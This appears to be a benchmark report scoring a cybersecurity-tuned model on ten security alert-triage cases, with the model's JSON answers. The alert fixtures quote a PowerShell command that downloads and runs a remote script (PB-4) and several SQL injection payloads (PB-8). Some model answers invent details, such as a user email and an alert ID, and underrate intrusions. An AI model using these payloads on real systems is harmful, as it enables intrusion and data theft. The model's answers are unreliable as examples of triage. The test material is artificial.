# Playbook benchmark — `hf.co/segolilylabs/Lily-Cybersecurity-7B-v0.2-GGUF:Q4_K_M`

Model: `hf.co/segolilylabs/Lily-Cybersecurity-7B-v0.2-GGUF:Q4_K_M`  
Mode: **describe-only**  
Run started: 2026-05-06 02:37:27  
Cases: 10  
Format failures: 0  

## Summary

| Metric | Score |
|---|---|
| Composite context-understanding score | **11%** |
| Verdict accuracy | 0/10 (0%) |
| Severity accuracy | 4/10 (40%) |
| MITRE accuracy | 2/10 (20%) |
| Tool-selection accuracy | 0/10 (0%) |
| Format failures | 0/10 |
| Forbidden tool calls (e.g. auto-isolate on benign) | 0 |
| Not-found tool responses (hallucinated entities) | 0 |
| p50 latency | 1.7 s |
| p95 latency | 2.3 s |

## Per-case results

| Case | Expected | Verdict | Severity | MITRE | Tools | Latency |
|---|---|---|---|---|---|---|
| PB-1 | beni | FAIL | PASS | PASS | FAIL | 3.0s |
| PB-2 | inci | FAIL | FAIL | FAIL | FAIL | 1.2s |
| PB-3 | inci | FAIL | PASS | FAIL | FAIL | 2.3s |
| PB-4 | inci | FAIL | PASS | FAIL | FAIL | 1.3s |
| PB-5 | inci | FAIL | FAIL | FAIL | FAIL | 1.2s |
| PB-6 | inci | FAIL | FAIL | FAIL | FAIL | 2.2s |
| PB-7 | beni | FAIL | PASS | PASS | FAIL | 0.6s |
| PB-8 | inci | FAIL | FAIL | FAIL | FAIL | 2.3s |
| PB-9 | inci | FAIL | FAIL | FAIL | FAIL | 1.4s |
| PB-10 | inci | FAIL | FAIL | FAIL | FAIL | 1.7s |

## Per-case detail

### PB-1 — expected: **benign** (severity ['info', 'low'], MITRE n/a)

_Alert_: Single-event alert: user `alice` (laptop 10.0.4.22) authenticated to the corporate intranet at 09:02 local time on a workday and opened her email. No prior failed attempts. Source matches her usual IP range.

_Latency_: 2.95s · GPU 92%/18145MB · CPU 17% · RAM 32311MB

_Tool calls_: (none)

_Parsed answer_:
```json
{
  "alert_type": "info",
  "severity": "low",
  "description": "User 'alice' (laptop 10.0.4.22) authenticated to the corporate intranet at 09:02 local time on a workday and opened her email. No prior failed attempts. Source matches her usual IP range.",
  "recommendation": "No further action required."
}
```

_Scoring_: verdict=FAIL severity=PASS mitre=PASS tools=FAIL

### PB-2 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1078', 'T1078.002', 'T1021', 'T1021.001'])

_Alert_: Domain admin account `dom_admin_01` authenticated successfully from external IP 41.78.122.18 at 03:14 UTC. Within 4 minutes the same account opened 18 RDP sessions to internal hosts (DC01, FILER-02, FINANCE-DB, ENG-FILE, BACKUP-01, …).

_Latency_: 1.19s · GPU 92%/18145MB · CPU 25% · RAM 32326MB

_Tool calls_: (none)

_Parsed answer_:
```json
{
  "alert_name": "Domain Admin Account Authentication from External IP",
  "description": "An authenticated domain admin account was accessed from an external IP and subsequently opened multiple RDP sessions to internal hosts within a short time frame.",
  "severity": 3,
  "details": {
    "account_name": "dom_admin_01",
    "external_ip": "41.78.122.18",
    "time": "03:14 UTC",
    "number_of_sessions": 18,
    "targeted_hosts": [
      "DC01",
      "FILER-02",
      "FINANCE-DB",
      "ENG-FILE",
      "BACKUP-01"
    ]
  }
}
```

_Scoring_: verdict=FAIL severity=FAIL mitre=FAIL tools=FAIL

### PB-3 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1110', 'T1110.001', 'T1110.003', 'T1110.004'])

_Alert_: Web server `webhost` (10.0.4.10): 50,000 POST requests to /wp-login.php from 1,200 distinct IPs within 10 minutes, including 3 successful logins to admin accounts. Sample source IP: 89.248.165.74.

_Latency_: 2.27s · GPU 92%/18147MB · CPU 24% · RAM 32352MB

_Tool calls_: (none)

_Parsed answer_:
```json
{
  "alert_name": "High Alert - Suspicious POST Requests",
  "description": "Web server `webhost` (10.0.4.10) received an unusual number of POST requests to /wp-login.php within a short time frame, originating from 1,200 distinct IPs. Three successful logins to admin accounts were also detected. The source IP for one of these suspicious requests is 89.248.165.74.",
  "severity": "High",
  "recommendations": [
    {
      "action": "Investigate the originating IPs and block any malicious ones.",
      "description": "Given the high number of POST requests to /wp-login.php, it is recommended to investigate the originating IP addresses thoroughly. Blocking any malicious IPs can help mitigate potential security risks."
    },
    {
      "action": "Review server logs for further suspicious activities.",
      "description": "A thorough review of the server logs can provide valuable insights into any other suspicious activities related to this incident. It is crucial to identify and address any potential vulnerabilities or unauthorized access attempts promptly."
    },
    {
      "action": "Implement additional security measures for admin accounts.",
      "description": "Given the successful logins to admin accounts, it is advisable to strengthen the security of these accounts. Implementing strong password policies, enabling multi-factor authentication, and regularly monitoring for any unauthorized access attempts can help mitigate the risk."
    }
  ]
}
```

_Scoring_: verdict=FAIL severity=PASS mitre=FAIL tools=FAIL

### PB-4 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1059.001', 'T1059', 'T1566.001', 'T1204', 'T1204.002'])

_Alert_: EDR alert on host WIN-DEV-04: `winword.exe` spawned `powershell.exe` which executed `IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.15/a.ps1')`. User: dave.

_Latency_: 1.28s · GPU 92%/18147MB · CPU 13% · RAM 32341MB

_Tool calls_: (none)

_Parsed answer_:
```json
{
  "alert_id": "EDR-WIN-DEV-04-winword-powershell-IEX",
  "severity": "High",
  "description": "An EDR alert was triggered on host WIN-DEV-04. The alert indicates that `winword.exe` spawned `powershell.exe`, which in turn executed a PowerShell script located at 'http://185.220.101.15/a.ps1'. The user associated with this activity is dave.johnson@example.com.",
  "recommendation": {
    "forensic_analysis": true,
    "network_isolation": true,
    "endpoint_protection": true,
    "incident_response": true
  }
}
```

_Scoring_: verdict=FAIL severity=PASS mitre=FAIL tools=FAIL

### PB-5 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1071.004', 'T1071', 'T1048.003', 'T1048'])

_Alert_: DNS server logs show internal host 10.0.4.55 issuing 4,000+ unique subdomain queries against `cdn-update.xyz` over 2 hours, with TXT-record responses averaging 200 bytes.

_Latency_: 1.24s · GPU 92%/18147MB · CPU 13% · RAM 32315MB

_Tool calls_: (none)

_Parsed answer_:
```json
{
  "alert_name": "DNS Server Logs: Unusual Subdomain Queries",
  "description": "An internal host, 10.0.4.55, has been observed querying the domain 'cdn-update.xyz' for over 4,000 unique subdomains within a span of 2 hours. The TXT-record responses from these queries average around 200 bytes in size.",
  "severity": "medium",
  "recommendation": {
    "investigate_subdomain_queries": true,
    "review_network_traffic": true,
    "check_for_malware_or_compromised_systems": true,
    "consider_blocking_cdn-update.xyz": true
  }
}
```

_Scoring_: verdict=FAIL severity=FAIL mitre=FAIL tools=FAIL

### PB-6 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1110', 'T1110.001', 'T1078'])

_Alert_: sshd on host `webhost` (10.0.4.10) recorded 7 failed password attempts for distinct usernames (admin, root, oracle, postgres, git, test, ubuntu) from source IP 185.220.101.45 between 03:41:02 and 03:41:20, followed by a successful login as `ubuntu` from the same IP at 03:43:21.

_Latency_: 2.19s · GPU 92%/18147MB · CPU 14% · RAM 32322MB

_Tool calls_: (none)

_Parsed answer_:
```json
{
  "alert_name": "Multiple Failed Password Attempts Followed by Successful Login",
  "description": "An alert was triggered when sshd on host webhost (10.0.4.10) recorded 7 failed password attempts for distinct usernames (admin, root, oracle, postgres, git, test, ubuntu) from source IP 185.220.101.45 between 03:41:02 and 03:41:20, followed by a successful login as ubuntu from the same IP at 03:43:21.",
  "severity": "medium",
  "details": {
    "host": "webhost",
    "ip_address": "10.0.4.10",
    "distinct_usernames": [
      "admin",
      "root",
      "oracle",
      "postgres",
      "git",
      "test",
      "ubuntu"
    ],
    "source_ip": "185.220.101.45",
    "failed_attempts": 7,
    "time_range": {
      "start_time": "03:41:02",
      "end_time": "03:41:20"
    },
    "successful_login": {
      "username": "ubuntu",
      "time": "03:43:21"
    }
  }
}
```

_Scoring_: verdict=FAIL severity=FAIL mitre=FAIL tools=FAIL

### PB-7 — expected: **benign** (severity ['info', 'low'], MITRE n/a)

_Alert_: Routine sshd event on `webhost` (10.0.4.10): publickey login accepted for `alice` from 10.0.4.22 at 09:14:32. PAM session opened. systemd-logind started session 2841.

_Latency_: 0.65s · GPU 92%/18147MB · CPU 15% · RAM 32309MB

_Tool calls_: (none)

_Parsed answer_:
```json
{
  "alert_name": "Routine sshd event on webhost",
  "description": "Publickey login accepted for alice from 10.0.4.22 at 09:14:32. PAM session opened. systemd-logind started session 2841.",
  "severity": "info"
}
```

_Scoring_: verdict=FAIL severity=PASS mitre=PASS tools=FAIL

### PB-8 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1190'])

_Alert_: Apache access log on `webhost` (10.0.4.10) shows 4 requests from 185.62.190.13 within 4 seconds: `GET /products.php?id=1' OR '1'='1--`, `GET /products.php?id=1+UNION+SELECT+username,password+FROM+users--`, `GET /products.php?id=1;DROP+TABLE+users--`, `GET /products.php?id=1+AND+SLEEP(5)--`. The UNION SELECT request returned a 200 with a 4129-byte body.

_Latency_: 2.32s · GPU 92%/18147MB · CPU 8% · RAM 32299MB

_Tool calls_: (none)

_Parsed answer_:
```json
{
  "alert_name": "Apache Access Log Suspicious Requests",
  "description": "Four suspicious requests were detected in the Apache access log of webhost (10.0.4.10). The IP address 185.62.190.13 made these requests within a short time frame, and one of them resulted in a 200 response with a large body.",
  "severity": "medium",
  "details": {
    "ip_address": "185.62.190.13",
    "requests": [
      {
        "request": "GET /products.php?id=1' OR '1'='1--",
        "response_code": null,
        "response_body_size": null
      },
      {
        "request": "GET /products.php?id=1+UNION+SELECT+username,password+FROM+users--",
        "response_code": 200,
        "response_body_size": 4129
      },
      {
        "request": "GET /products.php?id=1;DROP+TABLE+users--",
        "response_code": null,
        "response_body_size": null
      },
      {
        "request": "GET /products.php?id=1+AND+SLEEP(5)--",
        "response_code": null,
        "response_body_size": null
      }
    ]
  }
}
```

_Scoring_: verdict=FAIL severity=FAIL mitre=FAIL tools=FAIL

### PB-9 — expected: **incident** (severity ['medium', 'high'], MITRE ['T1098', 'T1548', 'T1136', 'T1078'])

_Alert_: On host `webhost` at 03:17:42, user `bob` (TTY pts/3) ran `sudo /usr/sbin/usermod -aG sudo svc_backup`. The change was applied (`add 'svc_backup' to group 'sudo'`). bob is a developer account with sudo rights but no documented need to modify service-account permissions at 03:17.

_Latency_: 1.37s · GPU 92%/18147MB · CPU 7% · RAM 32267MB

_Tool calls_: (none)

_Parsed answer_:
```json
{
  "alert": {
    "severity": "medium",
    "description": "Unauthorized user modification of group memberships",
    "details": {
      "host": "webhost",
      "user": "bob",
      "time": "03:17:42",
      "action": "Added 'svc_backup' to group 'sudo'",
      "account_type": "developer",
      "documented_need": false,
      "reason": "Unauthorized user modification of group memberships"
    }
  },
  "mitigation": {
    "recommendation": "Review and update access control policies to ensure proper authorization for group modifications.",
    "responsible_party": "Security Team",
    "action": "Investigate and document the incident, revoke sudo rights from user 'bob' if necessary."
  }
}
```

_Scoring_: verdict=FAIL severity=FAIL mitre=FAIL tools=FAIL

### PB-10 — expected: **incident** (severity ['high', 'critical'], MITRE ['T1110', 'T1110.001', 'T1110.003', 'T1078', 'T1078.002'])

_Alert_: Domain controller DC01: 5 sequential EventID 4625 (BadPassword) events for account `Administrator`, LogonType 3, source IP 192.168.50.13 (workstation KIOSK-04) between 02:18:14 and 02:18:24, followed by an EventID 4624 (success) for the same account from the same IP at 02:21:42.

_Latency_: 1.65s · GPU 92%/18147MB · CPU 9% · RAM 32269MB

_Tool calls_: (none)

_Parsed answer_:
```json
{
  "alert_name": "Sequential BadPassword Events",
  "alert_id": "1234567890",
  "description": "Five consecutive bad password attempts for the account 'Administrator' from IP address 192.168.50.13 (workstation KIOSK-04) occurred between 02:18:14 and 02:18:24, followed by a successful login at 02:21:42.",
  "severity": "medium",
  "recommendations": [
    {
      "action": "Investigate further",
      "description": "Examine the logs and determine if this is an attempted brute force attack or a compromised account. Implement account lockout policies to prevent unauthorized access attempts."
    },
    {
      "action": "Change passwords",
      "description": "As a precautionary measure, change the password for the 'Administrator' account and any other accounts that may have been compromised."
    }
  ]
}
```

_Scoring_: verdict=FAIL severity=FAIL mitre=FAIL tools=FAIL
